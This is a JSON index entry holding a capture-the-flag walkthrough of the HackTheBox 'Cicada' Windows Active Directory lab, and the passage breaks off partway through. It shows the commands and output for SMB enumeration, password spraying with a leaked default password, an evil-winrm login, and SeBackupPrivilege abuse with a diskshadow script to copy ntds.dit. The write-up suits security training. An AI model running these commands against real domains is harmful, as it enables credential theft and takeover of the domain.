[ { "title": "Cicada", "url": "/posts/Cicada/", "categories": "HackTheBox", "tags": "SMB, Active Directory, recon, SeBackupPrivilege, PrivEsc", "date": "2024-10-09 00:00:00 +0530", "snippet": "| Machine Link | https://app.hackthebox.com/machines/Cicada || ------------------ | --------------------------------------------------------- || Operating System ...", "content": "| Machine Link | https://app.hackthebox.com/machines/Cicada || ------------------ | --------------------------------------------------------- || Operating System | Windows (Active Directory) || Difficulty | Easy || Machine Created by | [theblxckcicada](https://app.hackthebox.com/users/796798) |## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/HTB/Cicada]â””â”€$ sudo nmap -sC -sV -p- -vv -T4 -oN Nmap_Result.txt -Pn 10.10.11.35Nmap scan report for 10.10.11.35Host is up, received user-set (0.20s latency).Scanned at 2024-10-09 15:10:35 IST for 491sNot shown: 65522 filtered tcp ports (no-response)PORT STATE SERVICE REASON VERSION53/tcp open domain syn-ack ttl 127 Simple DNS Plus88/tcp open kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-10-09 16:47:07Z)135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn389/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)|_ssl-date: TLS randomness does not represent time| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::, DNS:CICADA-DC.cicada.htb| Issuer: commonName=CICADA-DC-CA/domainComponent=cicada| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2024-08-22T20:24:16| Not valid after: 2025-08-22T20:24:16| MD5: 9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65| SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a| -----BEGIN CERTIFICATE-----| MIIF4DCCBMigAwIBAgITHgAAAAOY38QFU4GSRAABAAAAAzANBgkqhkiG9w0BAQsF| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGY2ljYWRh| MRUwEwYDVQQDEwxDSUNBREEtREMtQ0EwHhcNMjQwODIyMjAyNDE2WhcNMjUwODIy| MjAyNDE2WjAfMR0wGwYDVQQDExRDSUNBREEtREMuY2ljYWRhLmh0YjCCASIwDQYJ| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAOatZznJ1Zy5E8fVFsDWtq531KAmTyX8| BxPdIVefG1jKHLYTvSsQLVDuv02+p29iH9vnqYvIzSiFWilKCFBxtfOpyvCaEQua| NaJqv3quymk/pw0xMfSLMuN5emPJ5yHtC7cantY51mSDrvXBxMVIf23JUKgbhqSc| Srdh8fhL8XKgZXVjHmQZVn4ONg2vJP2tu7P1KkXXj7Mdry9GFEIpLdDa749PLy7x| o1yw8CloMMtcFKwVaJHy7tMgwU5PVbFBeUhhKhQ8jBR3OBaMBtqIzIAJ092LNysy| 4W6q8iWFc+Tb43gFP4nfb1Xvp5mJ2pStqCeZlneiL7Be0SqdDhljB4ECAwEAAaOC| Au4wggLqMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8A| bABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/| BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3| DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjAL| BglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFAY5YMN7| Sb0WV8GpzydFLPC+751AMB8GA1UdIwQYMBaAFIgPuAt1+B1uRE3nh16Q6gSBkTzp| MIHLBgNVHR8EgcMwgcAwgb2ggbqggbeGgbRsZGFwOi8vL0NOPUNJQ0FEQS1EQy1D| QSxDTj1DSUNBREEtREMsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2Vz| LENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y2ljYWRhLERDPWh0Yj9j| ZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlz| dHJpYnV0aW9uUG9pbnQwgb0GCCsGAQUFBwEBBIGwMIGtMIGqBggrBgEFBQcwAoaB| nWxkYXA6Ly8vQ049Q0lDQURBLURDLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXkl| MjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWNpY2Fk| YSxEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmlj| YXRpb25BdXRob3JpdHkwQAYDVR0RBDkwN6AfBgkrBgEEAYI3GQGgEgQQ0dpG4APi| HkGYUf0NXWYT14IUQ0lDQURBLURDLmNpY2FkYS5odGIwDQYJKoZIhvcNAQELBQAD| ggEBAIrY4wzebzUMnbrfpkvGA715ds8pNq06CN4/24q0YmowD+XSR/OI0En8Z9LE| eytwBsFZJk5qv9yY+WL4Ubb4chKSsNjuc5SzaHxXAVczpNlH/a4WAKfVMU2D6nOb| xxqE1cVIcOyN4b3WUhRNltauw81EUTa4xT0WElw8FevodHlBXiUPUT9zrBhnvNkz| obX8oU3zyMO89QwxsusZ0TLiT/EREW6N44J+ROTUzdJwcFNRl+oLsiK5z/ltLRmT| P/gFJvqMFfK4x4/ftmQV5M3hb0rzUcS4NJCGtclEoxlJHRTDTG6yZleuHvKSN4JF| ji6zxYOoOznp6JlmbakLb1ZRLA8=|_-----END CERTIFICATE-----445/tcp open microsoft-ds? syn-ack ttl 127464/tcp open kpasswd5? syn-ack ttl 127593/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0636/tcp open ssl/ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)|_ssl-date: TLS randomness does not represent time| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::, DNS:CICADA-DC.cicada.htb| Issuer: commonName=CICADA-DC-CA/domainComponent=cicada| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2024-08-22T20:24:16| Not valid after: 2025-08-22T20:24:16| MD5: 9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65| SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a| -----BEGIN CERTIFICATE-----| MIIF4DCCBMigAwIBAgITHgAAAAOY38QFU4GSRAABAAAAAzANBgkqhkiG9w0BAQsF| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGY2ljYWRh| MRUwEwYDVQQDEwxDSUNBREEtREMtQ0EwHhcNMjQwODIyMjAyNDE2WhcNMjUwODIy| MjAyNDE2WjAfMR0wGwYDVQQDExRDSUNBREEtREMuY2ljYWRhLmh0YjCCASIwDQYJ| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAOatZznJ1Zy5E8fVFsDWtq531KAmTyX8| BxPdIVefG1jKHLYTvSsQLVDuv02+p29iH9vnqYvIzSiFWilKCFBxtfOpyvCaEQua| NaJqv3quymk/pw0xMfSLMuN5emPJ5yHtC7cantY51mSDrvXBxMVIf23JUKgbhqSc| Srdh8fhL8XKgZXVjHmQZVn4ONg2vJP2tu7P1KkXXj7Mdry9GFEIpLdDa749PLy7x| o1yw8CloMMtcFKwVaJHy7tMgwU5PVbFBeUhhKhQ8jBR3OBaMBtqIzIAJ092LNysy| 4W6q8iWFc+Tb43gFP4nfb1Xvp5mJ2pStqCeZlneiL7Be0SqdDhljB4ECAwEAAaOC| Au4wggLqMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8A| bABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/| BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3| DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjAL| BglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFAY5YMN7| Sb0WV8GpzydFLPC+751AMB8GA1UdIwQYMBaAFIgPuAt1+B1uRE3nh16Q6gSBkTzp| MIHLBgNVHR8EgcMwgcAwgb2ggbqggbeGgbRsZGFwOi8vL0NOPUNJQ0FEQS1EQy1D| QSxDTj1DSUNBREEtREMsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2Vz| LENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y2ljYWRhLERDPWh0Yj9j| ZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlz| dHJpYnV0aW9uUG9pbnQwgb0GCCsGAQUFBwEBBIGwMIGtMIGqBggrBgEFBQcwAoaB| nWxkYXA6Ly8vQ049Q0lDQURBLURDLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXkl| MjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWNpY2Fk| YSxEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmlj| YXRpb25BdXRob3JpdHkwQAYDVR0RBDkwN6AfBgkrBgEEAYI3GQGgEgQQ0dpG4APi| HkGYUf0NXWYT14IUQ0lDQURBLURDLmNpY2FkYS5odGIwDQYJKoZIhvcNAQELBQAD| ggEBAIrY4wzebzUMnbrfpkvGA715ds8pNq06CN4/24q0YmowD+XSR/OI0En8Z9LE| eytwBsFZJk5qv9yY+WL4Ubb4chKSsNjuc5SzaHxXAVczpNlH/a4WAKfVMU2D6nOb| xxqE1cVIcOyN4b3WUhRNltauw81EUTa4xT0WElw8FevodHlBXiUPUT9zrBhnvNkz| obX8oU3zyMO89QwxsusZ0TLiT/EREW6N44J+ROTUzdJwcFNRl+oLsiK5z/ltLRmT| P/gFJvqMFfK4x4/ftmQV5M3hb0rzUcS4NJCGtclEoxlJHRTDTG6yZleuHvKSN4JF| ji6zxYOoOznp6JlmbakLb1ZRLA8=|_-----END CERTIFICATE-----3268/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::, DNS:CICADA-DC.cicada.htb| Issuer: commonName=CICADA-DC-CA/domainComponent=cicada| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2024-08-22T20:24:16| Not valid after: 2025-08-22T20:24:16| MD5: 9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65| SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a| -----BEGIN CERTIFICATE-----| MIIF4DCCBMigAwIBAgITHgAAAAOY38QFU4GSRAABAAAAAzANBgkqhkiG9w0BAQsF| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGY2ljYWRh| MRUwEwYDVQQDEwxDSUNBREEtREMtQ0EwHhcNMjQwODIyMjAyNDE2WhcNMjUwODIy| MjAyNDE2WjAfMR0wGwYDVQQDExRDSUNBREEtREMuY2ljYWRhLmh0YjCCASIwDQYJ| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAOatZznJ1Zy5E8fVFsDWtq531KAmTyX8| BxPdIVefG1jKHLYTvSsQLVDuv02+p29iH9vnqYvIzSiFWilKCFBxtfOpyvCaEQua| NaJqv3quymk/pw0xMfSLMuN5emPJ5yHtC7cantY51mSDrvXBxMVIf23JUKgbhqSc| Srdh8fhL8XKgZXVjHmQZVn4ONg2vJP2tu7P1KkXXj7Mdry9GFEIpLdDa749PLy7x| o1yw8CloMMtcFKwVaJHy7tMgwU5PVbFBeUhhKhQ8jBR3OBaMBtqIzIAJ092LNysy| 4W6q8iWFc+Tb43gFP4nfb1Xvp5mJ2pStqCeZlneiL7Be0SqdDhljB4ECAwEAAaOC| Au4wggLqMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8A| bABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/| BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3| DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjAL| BglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFAY5YMN7| Sb0WV8GpzydFLPC+751AMB8GA1UdIwQYMBaAFIgPuAt1+B1uRE3nh16Q6gSBkTzp| MIHLBgNVHR8EgcMwgcAwgb2ggbqggbeGgbRsZGFwOi8vL0NOPUNJQ0FEQS1EQy1D| QSxDTj1DSUNBREEtREMsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2Vz| LENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y2ljYWRhLERDPWh0Yj9j| ZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlz| dHJpYnV0aW9uUG9pbnQwgb0GCCsGAQUFBwEBBIGwMIGtMIGqBggrBgEFBQcwAoaB| nWxkYXA6Ly8vQ049Q0lDQURBLURDLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXkl| MjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWNpY2Fk| YSxEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmlj| YXRpb25BdXRob3JpdHkwQAYDVR0RBDkwN6AfBgkrBgEEAYI3GQGgEgQQ0dpG4APi| HkGYUf0NXWYT14IUQ0lDQURBLURDLmNpY2FkYS5odGIwDQYJKoZIhvcNAQELBQAD| ggEBAIrY4wzebzUMnbrfpkvGA715ds8pNq06CN4/24q0YmowD+XSR/OI0En8Z9LE| eytwBsFZJk5qv9yY+WL4Ubb4chKSsNjuc5SzaHxXAVczpNlH/a4WAKfVMU2D6nOb| xxqE1cVIcOyN4b3WUhRNltauw81EUTa4xT0WElw8FevodHlBXiUPUT9zrBhnvNkz| obX8oU3zyMO89QwxsusZ0TLiT/EREW6N44J+ROTUzdJwcFNRl+oLsiK5z/ltLRmT| P/gFJvqMFfK4x4/ftmQV5M3hb0rzUcS4NJCGtclEoxlJHRTDTG6yZleuHvKSN4JF| ji6zxYOoOznp6JlmbakLb1ZRLA8=|_-----END CERTIFICATE-----|_ssl-date: TLS randomness does not represent time3269/tcp open ssl/ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::, DNS:CICADA-DC.cicada.htb| Issuer: commonName=CICADA-DC-CA/domainComponent=cicada| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2024-08-22T20:24:16| Not valid after: 2025-08-22T20:24:16| MD5: 9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65| SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a| -----BEGIN CERTIFICATE-----| MIIF4DCCBMigAwIBAgITHgAAAAOY38QFU4GSRAABAAAAAzANBgkqhkiG9w0BAQsF| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGY2ljYWRh| MRUwEwYDVQQDEwxDSUNBREEtREMtQ0EwHhcNMjQwODIyMjAyNDE2WhcNMjUwODIy| MjAyNDE2WjAfMR0wGwYDVQQDExRDSUNBREEtREMuY2ljYWRhLmh0YjCCASIwDQYJ| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAOatZznJ1Zy5E8fVFsDWtq531KAmTyX8| BxPdIVefG1jKHLYTvSsQLVDuv02+p29iH9vnqYvIzSiFWilKCFBxtfOpyvCaEQua| NaJqv3quymk/pw0xMfSLMuN5emPJ5yHtC7cantY51mSDrvXBxMVIf23JUKgbhqSc| Srdh8fhL8XKgZXVjHmQZVn4ONg2vJP2tu7P1KkXXj7Mdry9GFEIpLdDa749PLy7x| o1yw8CloMMtcFKwVaJHy7tMgwU5PVbFBeUhhKhQ8jBR3OBaMBtqIzIAJ092LNysy| 4W6q8iWFc+Tb43gFP4nfb1Xvp5mJ2pStqCeZlneiL7Be0SqdDhljB4ECAwEAAaOC| Au4wggLqMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8A| bABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/| BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3| DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjAL| BglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFAY5YMN7| Sb0WV8GpzydFLPC+751AMB8GA1UdIwQYMBaAFIgPuAt1+B1uRE3nh16Q6gSBkTzp| MIHLBgNVHR8EgcMwgcAwgb2ggbqggbeGgbRsZGFwOi8vL0NOPUNJQ0FEQS1EQy1D| QSxDTj1DSUNBREEtREMsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2Vz| LENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y2ljYWRhLERDPWh0Yj9j| ZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlz| dHJpYnV0aW9uUG9pbnQwgb0GCCsGAQUFBwEBBIGwMIGtMIGqBggrBgEFBQcwAoaB| nWxkYXA6Ly8vQ049Q0lDQURBLURDLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXkl| MjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWNpY2Fk| YSxEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmlj| YXRpb25BdXRob3JpdHkwQAYDVR0RBDkwN6AfBgkrBgEEAYI3GQGgEgQQ0dpG4APi| HkGYUf0NXWYT14IUQ0lDQURBLURDLmNpY2FkYS5odGIwDQYJKoZIhvcNAQELBQAD| ggEBAIrY4wzebzUMnbrfpkvGA715ds8pNq06CN4/24q0YmowD+XSR/OI0En8Z9LE| eytwBsFZJk5qv9yY+WL4Ubb4chKSsNjuc5SzaHxXAVczpNlH/a4WAKfVMU2D6nOb| xxqE1cVIcOyN4b3WUhRNltauw81EUTa4xT0WElw8FevodHlBXiUPUT9zrBhnvNkz| obX8oU3zyMO89QwxsusZ0TLiT/EREW6N44J+ROTUzdJwcFNRl+oLsiK5z/ltLRmT| P/gFJvqMFfK4x4/ftmQV5M3hb0rzUcS4NJCGtclEoxlJHRTDTG6yZleuHvKSN4JF| ji6zxYOoOznp6JlmbakLb1ZRLA8=|_-----END CERTIFICATE-----|_ssl-date: TLS randomness does not represent time5985/tcp open http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found53875/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPCService Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-security-mode: | 3:1:1: |_ Message signing enabled and required| smb2-time: | date: 2024-10-09T16:48:07|_ start_date: N/A| p2p-conficker: | Checking for Conficker.C or higher...| Check 1 (port 43674/tcp): CLEAN (Timeout)| Check 2 (port 28298/tcp): CLEAN (Timeout)| Check 3 (port 62917/udp): CLEAN (Timeout)| Check 4 (port 65105/udp): CLEAN (Timeout)|_ 0/4 checks are positive: Host is CLEAN or ports are blocked|_clock-skew: 7h00m00sRead data files from: /usr/share/nmapService detection performed. Please report any incorrect results at https://nmap.org/submit/ .```## SMB Enumeration â¤µï¸I checked for the null user/password as an authentication for SMB server through netexec and I got the domain name as `cicada.htb`.```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/HTB/Cicada]â””â”€$ nxc smb 10.10.11.35 -u '' -p '' --shares SMB 10.10.11.35 445 CICADA-DC [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)SMB 10.10.11.35 445 CICADA-DC [+] cicada.htb\\: SMB 10.10.11.35 445 CICADA-DC [-] Error enumerating shares: STATUS_ACCESS_DENIED```Now Lets look for a user authentication in this case I will be using Anonymous as a guest user to check for any shares enabled for that user or not.```bashnxc smb 10.10.11.35 -u 'Anonymous' -p '' --shares```![](Pasted%20image%2020241009170120.png)Let's access this ***HR*** share with smbclient Tool ðŸ”»```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/HTB/Cicada]â””â”€$ smbclient //10.10.11.35/HR -U 'Anonymous' Password for [WORKGROUP\\Anonymous]:Try \"help\" to get a list of possible commands.smb: \\> ls . D 0 Thu Mar 14 17:59:09 2024 .. D 0 Thu Mar 14 17:51:29 2024 Notice from HR.txt A 1266 Wed Aug 28 23:01:48 2024\t\t4168447 blocks of size 4096. 308256 blocks availablesmb: \\> mget *Get file Notice from HR.txt? ygetting file \\Notice from HR.txt of size 1266 as Notice from HR.txt (0.9 KiloBytes/sec) (average 0.9 KiloBytes/sec)smb: \\> exit```Lets look inside this `Notice from HR.txt` file ðŸ”»```â”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/HTB/Cicada]â””â”€$ cat Notice\\ from\\ HR.txt Dear new hire!Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.Your default password is: Cicada$M6Corpb*@Lp#nZp!8To change your password:1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.2. Once logged in, navigate to your account settings or profile settings section.3. Look for the option to change your password. This will be labeled as \"Change Password\".4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.5. After changing your password, make sure to save your changes.Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!Best regards,Cicada Corp```Let's gather some users as this Anonymous user also got access to read `$IPC` share that means , It can also enumerate users and groups from this netexec Tool only.```bashnxc smb 10.10.11.35 -u 'Anonymous' -p '' --rid-brute```![](Pasted%20image%2020241009170945.png)I separated all the users in a file named as `users.txt` file.Now lets check which user hash this password `Cicada$M6Corpb*@Lp#nZp!8`.```bashnxc smb 10.10.11.35 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success --shares```![](Pasted%20image%2020241009170744.png)I got these share while checking this user michael.wrightson ðŸ”»```nxc smb 10.10.11.35 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --shares```![](Pasted%20image%2020241009171226.png)Lets also enumerate some users properly with the netexec Tool flag functionality of `--users` that extract the users and its descriptions.```nxc smb 10.10.11.35 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --users```![](Pasted%20image%2020241009171307.png)I got the creds for user david.orelious so lets see its share now , I think now that user can access share DEV .```nxc smb 10.10.11.35 -u 'david.orelious' -p '' --shares```![](Pasted%20image%2020241009171351.png)Lets see what inside this share DEV.```â”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/HTB/Cicada]â””â”€$ smbclient //10.10.11.35/DEV -U 'david.orelious'Password for [WORKGROUP\\david.orelious]:Try \"help\" to get a list of possible commands.smb: \\> ls . D 0 Wed Oct 9 21:46:35 2024 .. D 0 Thu Mar 14 17:51:29 2024 Backup_script.ps1 A 601 Wed Aug 28 22:58:22 2024 ZxbFGRMvap D 0 Wed Oct 9 21:46:04 2024\t\t4168447 blocks of size 4096. 308251 blocks availablesmb: \\> prompt offsmb: \\> mget *getting file \\Backup_script.ps1 of size 601 as Backup_script.ps1 (0.7 KiloBytes/sec) (average 0.7 KiloBytes/sec)smb: \\> cd ZxbFGRMvapsmb: \\ZxbFGRMvap\\> ls . D 0 Wed Oct 9 21:46:04 2024 .. D 0 Wed Oct 9 21:46:35 2024\t\t4168447 blocks of size 4096. 308249 blocks availablesmb: \\ZxbFGRMvap\\> cd ..smb: \\> exotexot: command not foundsmb: \\> exit``````â”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/HTB/Cicada]â””â”€$ cat Backup_script.ps1 $sourceDirectory = \"C:\\smb\"$destinationDirectory = \"D:\\Backup\"$username = \"emily.oscars\"$password = ConvertTo-SecureString \"\" -AsPlainText -Force$credentials = New-Object System.Management.Automation.PSCredential($username, $password)$dateStamp = Get-Date -Format \"yyyyMMdd_HHmmss\"$backupFileName = \"smb_backup_$dateStamp.zip\"$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileNameCompress-Archive -Path $sourceDirectory -DestinationPath $backupFilePathWrite-Host \"Backup completed successfully. Backup file saved to: $backupFilePath\"```Since I got the password for user emily.oscars from the `backup_script.ps1` file, Lets see if I can have a winrm session with that or now or wait lets check all the creds with winrm session and for that I am gona save the usernames in `user.txt` file and passwords in `pass.txt` file with respective positions.Now with netexec Tools lets check ðŸ”»```nxc winrm 10.10.11.35 -u user.txt -p pass.txt --no-bruteforce --continue-on-success```![](Pasted%20image%2020241009171516.png)_Winrm session enabled on user emily.oscars_## Winrm Session â¤µï¸ ```powershellâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/HTB/Cicada]â””â”€$ evil-winrm -i 10.10.11.35 -u emily.oscars -p '' Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\emily.oscars.CICADA\\Documents> cd ..*Evil-WinRM* PS C:\\Users\\emily.oscars.CICADA> whoamicicada\\emily.oscars*Evil-WinRM* PS C:\\Users\\emily.oscars.CICADA> hostnameCICADA-DC*Evil-WinRM* PS C:\\Users\\emily.oscars.CICADA> tree /f /aFolder PATH listingVolume serial number is 1B60-8905C:.| NTUSER.DAT|+---Desktop| user.txt|+---Documents+---Downloads+---Favorites+---Links+---Music+---Pictures+---Saved Games\\---Videos*Evil-WinRM* PS C:\\Users\\emily.oscars.CICADA> cd Desktop*Evil-WinRM* PS C:\\Users\\emily.oscars.CICADA\\Desktop> cat user.txt3f629d1d79f940db2d88b0172b2d9126*Evil-WinRM* PS C:\\Users\\emily.oscars.CICADA\\Desktop> ``````powershell*Evil-WinRM* PS C:\\Users> net user emily.oscars```![](Pasted%20image%2020241009171757.png)_Part of Backup Operators Group member_```powershell*Evil-WinRM* PS C:\\Users\\emily.oscars.CICADA\\Videos> Import-Module .\\SeBackupPrivilegeCmdLets.dll*Evil-WinRM* PS C:\\Users\\emily.oscars.CICADA\\Videos> Import-Module .\\SeBackupPrivilegeUtils.dll*Evil-WinRM* PS C:\\Users\\emily.oscars.CICADA\\Videos> mkdir C:\\Temp Directory: C:\\Mode LastWriteTime Length Name---- ------------- ------ ----d----- 10/9/2024 10:24 AM Temp*Evil-WinRM* PS C:\\Users\\emily.oscars.CICADA\\Videos> *Evil-WinRM* PS C:\\Users\\emily.oscars.CICADA\\Videos> Copy-FileSeBackupPrivilege C:\\Windows\\NTDS\\ntds.dit C:\\Temp\\ntds.ditOpening input file. - The process cannot access the file because it is being used by another process. (Exception from HRESULT: 0x80070020)At line:1 char:1+ Copy-FileSeBackupPrivilege C:\\Windows\\NTDS\\ntds.dit C:\\Temp\\ntds.dit+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : NotSpecified: (:) [Copy-FileSeBackupPrivilege], Exception + FullyQualifiedErrorId : System.Exception,bz.OneOEight.SeBackupPrivilege.Copy_FileSeBackupPrivilege*Evil-WinRM* PS C:\\Users\\emily.oscars.CICADA\\Videos>```Since the `The process cannot access the file because it is being used by another process.` I have to use another alternative process to access this ntds.dit file with the help of diskshadow method.This is the script for diskshadow that is `back_script.txt` file ðŸ”»```set verbose onXset metadata C:\\Windows\\Temp\\meta.cabXset context clientaccessibleXset context persistentXbegin backupXadd volume C: alias cdriveXcreateXexpose %cdrive% E:Xend backupX```Here's a simple explanation of each line of the `diskshadow` script:1. **set verbose on**: This turns on detailed logging, so the 